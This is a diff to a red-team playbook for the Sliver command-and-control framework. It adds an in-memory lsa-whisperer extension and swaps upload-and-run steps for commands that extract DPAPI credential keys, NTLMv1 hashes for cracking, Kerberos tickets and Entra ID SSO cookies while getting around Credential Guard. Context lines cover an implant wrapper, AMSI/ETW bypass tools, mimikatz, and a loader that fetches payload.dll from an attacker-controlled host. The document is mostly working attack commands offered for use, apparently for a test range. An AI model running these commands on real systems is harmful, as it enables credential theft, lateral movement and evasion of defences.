@@ -90,6 +90,24 @@ armory install all
 
 This installs ALL extensions/aliases: nanodump, mimikatz, rubeus, credman, sharpsecdump, sharpdpapi, sharpchrome, seatbelt, sharpview, sharpup, sharp-hound-4, certify, sqlrecon, inject-amsi-bypass, inject-etw-bypass, unhook-bof, all 52+ sa-* BOFs, all lateral movement tools, and more.
 
+### 1d: Install lsa-whisperer BOF Extension
+
+lsa-whisperer is a BOF extension that uses legitimate LSA APIs (no direct LSASS memory access). Works through Credential Guard.
+
+```bash
+# Build and install (requires mingw-w64)
+cd /root/sliver/armory/lsa-whisperer
+chmod +x install.sh
+./install.sh
+```
+
+Or manually load in Sliver console:
+```
+extensions load /root/sliver/armory/lsa-whisperer/build/pkg/lsa-whisperer
+```
+
+This adds 10 commands: `lsa-credkey`, `lsa-strongcredkey`, `lsa-ntlmv1`, `lsa-klist`, `lsa-dump`, `lsa-purge`, `lsa-ssocookie`, `lsa-devicessocookie`, `lsa-enterprisesso`, `lsa-cloudinfo`.
+
 ---
 
 ## Step 2: Generate Harriet-Wrapped Implant
@@ -445,20 +463,31 @@ hashdump
 For tools NOT in the armory, use `execute-assembly` with local .exe files from `/root/sliver/tools/`:
 
 ```
-# LSA Whisperer — works even with Credential Guard enabled
-# NOTE: Native C++ exe, NOT .NET — cannot use execute-assembly (needs CLR)
-# Must upload + execute, or use shell command
-upload /root/sliver/tools/sharp-tools/lsa-whisperer.exe C:\Windows\Temp\lw.exe
-shell
-# Then in the shell:
-C:\Windows\Temp\lw.exe --msv credkey
-C:\Windows\Temp\lw.exe --msv ntlmv1
-C:\Windows\Temp\lw.exe --kerberos klist
-C:\Windows\Temp\lw.exe --kerberos dump
-C:\Windows\Temp\lw.exe --cloudap ssocookie
-# Type 'exit' to return to Sliver
-# Clean up:
-rm C:\Windows\Temp\lw.exe
+# lsa-whisperer BOF — runs in-process via coff-loader, no file on disk
+# Works through Credential Guard, uses legitimate LSA APIs
+# Installed by setup.sh, auto-loaded by Sliver
+
+# DPAPI credential key extraction (bypasses Credential Guard)
+lsa-credkey
+lsa-credkey --luid 0x3e7                          # SYSTEM session (requires SYSTEM)
+lsa-strongcredkey                                  # Enhanced keys (Windows 10+)
+
+# NTLMv1 response for cracking (default challenge = crack.sh compatible)
+lsa-ntlmv1                                        # Current session
+lsa-ntlmv1 --luid 0x3e7                           # SYSTEM session
+lsa-ntlmv1 --luid 0x3e7 --challenge 1122334455667788  # Custom challenge
+
+# Kerberos ticket operations
+lsa-klist                                          # List all cached tickets
+lsa-dump                                           # Export tickets as base64 .kirbi
+lsa-purge                                          # Purge all tickets
+lsa-purge --server krbtgt/CONTOSO.RANGE            # Purge specific ticket
+
+# Azure/Entra ID SSO tokens (hybrid-joined machines)
+lsa-ssocookie                                      # Entra ID SSO cookie
+lsa-devicessocookie                                # Device-level SSO
+lsa-enterprisesso                                  # AD FS enterprise SSO
+lsa-cloudinfo                                      # Cloud provider status
 
 # Seatbelt — full host recon
 execute-assembly --in-process /root/sliver/tools/sharp-tools/Seatbelt.exe -group=all
@@ -484,7 +513,6 @@ All execute-assembly tools are in one directory:
 
 ```
 /root/sliver/tools/sharp-tools/
-├── lsa-whisperer.exe    # Credential Guard bypass (EvanMcBroom)
 ├── Rubeus.exe           # Kerberos attacks
 ├── Seatbelt.exe         # Host recon
 ├── SharpUp.exe          # Privesc checks
@@ -573,16 +601,15 @@ Invoke-Binary /home/kali/tools/SharpUp.exe audit
 Invoke-Binary /home/kali/tools/Certify.exe find /vulnerable
 Invoke-Binary /home/kali/tools/SharpDPAPI.exe triage
 
-# LSA Whisperer — works even with Credential Guard (talks to LSA directly)
-# NOTE: Native C++ exe, NOT .NET — Invoke-Binary won't work (needs CLR)
-# Upload first, then execute directly:
-upload /root/sliver/tools/sharp-tools/lsa-whisperer.exe C:\Windows\Temp\lw.exe
-cmd /c C:\Windows\Temp\lw.exe --msv credkey
-cmd /c C:\Windows\Temp\lw.exe --msv ntlmv1
-cmd /c C:\Windows\Temp\lw.exe --kerberos klist
-cmd /c C:\Windows\Temp\lw.exe --kerberos dump
-cmd /c C:\Windows\Temp\lw.exe --cloudap ssocookie
-del C:\Windows\Temp\lw.exe
+# LSA Whisperer — BOF extension, runs in-process via coff-loader
+# No file on disk, works through Credential Guard
+# (Installed by setup.sh, loaded automatically by Sliver)
+lsa-credkey                                        # DPAPI credential keys
+lsa-ntlmv1                                        # NTLMv1 for cracking
+lsa-klist                                          # List Kerberos tickets
+lsa-dump                                           # Export .kirbi tickets
+lsa-ssocookie                                      # Entra ID SSO token
+lsa-cloudinfo                                      # Azure AD join status
 
 # Load DLLs in memory
 Dll-Loader -http http://YOUR_IP:8080/payload.dll
